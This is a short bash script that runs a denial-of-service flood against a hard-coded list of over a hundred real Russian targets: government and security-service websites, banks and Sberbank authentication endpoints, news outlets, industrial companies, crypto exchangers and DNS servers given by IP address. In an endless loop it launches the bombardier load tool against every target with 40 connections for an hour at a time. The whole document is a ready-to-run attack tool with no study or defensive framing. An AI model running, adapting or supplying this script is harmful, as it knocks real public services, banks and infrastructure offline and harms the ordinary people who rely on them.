#!/bin/bash -x

DESTS=( "https://srt-ns1.srv.lukoil.com/" "https://srt-ns2.srv.lukoil.com/" "https://ns2.srv.lukoil.com/" "https://ns1.srv.lukoil.com/" "https://gltb-ns2.srv.lukoil.com/" "https://gltb-ns1.srv.lukoil.com/" "https://db24-ns2.srv.lukoil.com/" "https://db24-ns1.srv.lukoil.com/" "http://178.208.94.231/" "http://www.fsb.ru/" "https://cleanbtc.ru/" "https://bonkypay.com/" "https://changer.club/" "https://superchange.net/" "https://mine.exchange/" "https://platov.co/" "https://ww-pay.net/" "https://delets.cash/" "https://betatransfer.org/" "https://ramon.money/" "https://coinpaymaster.com/" "https://bitokk.biz/" "https://www.netex24.net/" "https://cashbank.pro/" "https://flashobmen.com/" "https://abcobmen.com/" "https://ychanger.net/" "https://multichange.net/" "https://24paybank.ne/" "https://royal.cash/" "https://prostocash.com/" "https://baksman.org/" "https://kupibit.me/" "https://abcobmen.com/" "194.67.2.109:53" "194.67.7.1:53" "194.54.14.187:53" "194.54.14.186:53" "https://api.developer.sber.ru/product/SberbankID" "https://api.sberbank.ru/prod/tokens/v2/oauth" "https://api.sberbank.ru/prod/tokens/v2/oidc" "https://ria.ru/" "https://gazeta.ru/" "https://kp.ru/" "https://riafan.ru/" "https://pikabu.ru/" "https://kommersant.ru/" "https://mk.ru/" "https://yaplakal.com/" "https://rbc.ru/" "https://bezformata.com/" "https://lenta.ru/" "https://lenta.ru/" "http://vesti.ru/" "https://proverki.gov.ru/" "https://stroi.gov.ru/" "https://pwd.wto.economy.gov.ru/" "https://mvd.gov.ru/" "https://cloud.rkn.gov.ru/" "https://mail.rkn.gov.ru/" "https://109.207.1.97/" "https://109.207.1.118/" "https://rkn.gov.ru/" "https://www.nalog.gov.ru/" "https://mil.ru/" "http://government.ru/" "http://kremlin.ru/" "https://www.mos.ru/uslugi/" "https://www.gazprombank.ru/" "https://www.vtb.ru/" "https://www.sberbank.ru" "https://omk.ru/" "https://www.eurosib.ru/" "https://www.uralkali.com/ru/" "https://www.polymetalinternational.com/ru/" "https://ya.ru/" "https://www.tmk-group.ru/" "https://rmk-group.ru/ru/" "https://nangs.org/" "https://www.metalloinvest.com/" "https://www.severstal.com/" "https://www.sibur.ru/" "https://nlmk.com/" "https://www.evraz.com/ru/" "https://www.tatneft.ru/" "https://www.surgutneftegas.ru/" "https://www.nornickel.com/" "https://magnit.ru/" "https://lukoil.ru" "http://duma.gov.ru/" "https://gazprom.ru/" "http://president-sovet.ru/" "https://sovetnational.ru/" "https://www.gosuslugi.ru/ru/" "https://zakupki.gov.ru/epz/main/public/home.html" "https://gossluzhba.gov.ru/" "http://defence.council.gov.ru/" "http://budget.council.gov.ru/" "http://www.kremlin.ru/" "https://government.ru/" "http://www.scrf.gov.ru/" "http://www.ksrf.ru/ru/Pages/default.aspx" "http://www.vsrf.ru/" "http://premier.gov.ru/events/" "https://www.mchs.gov.ru/" "https://minjust.gov.ru/ru/" "http://www.fsb.ru/" "https://rosguard.gov.ru/" "https://customs.gov.ru/" "https://udprf.ru/" "http://favt.gov.ru/" "http://194.67.2.109:53/UDP" "http://194.67.7.1:53/UDP" "http://194.54.14.187:53/UDP" "http://194.54.14.186:53/UDP" )

TIME="60m"
CONNECTIONSPERTARGET=40

while true
do
    for DEST in ${DESTS[@]}
    do
        bombardier -c $CONNECTIONSPERTARGET -d $TIME -l $DEST &
    done
	sleep 3550s
done

